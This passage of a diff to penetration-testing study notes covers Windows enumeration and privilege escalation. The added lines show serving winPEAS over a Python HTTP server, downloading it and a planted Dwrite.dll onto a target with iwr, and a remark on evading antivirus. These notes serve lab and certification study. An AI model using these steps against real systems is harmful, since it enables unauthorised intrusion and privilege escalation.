@@ -118,7 +118,20 @@ xfreerdp /u:USER /p:'PASSWORD' /v:$target /cert-ignore /w:1366 /h:768
 xfreerdp /u:daveadmin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
           
 Search for event 4104 to see ScriptBlockLog events
+         
+### automation
+ winPeas... serve it up to target using 
           
+python3 -m http.server 80
+          
+then on target download using
+
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+          
+from INE I learned about using
+ iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll
+          
+** automated tools can be blocked by AV solutions. If this is the case, we can apply techniques learned in the Module "Antivirus Evasion", try other tools such as Seatbelt2 and JAWS,3 or do the enumeration manually.
           
        
 
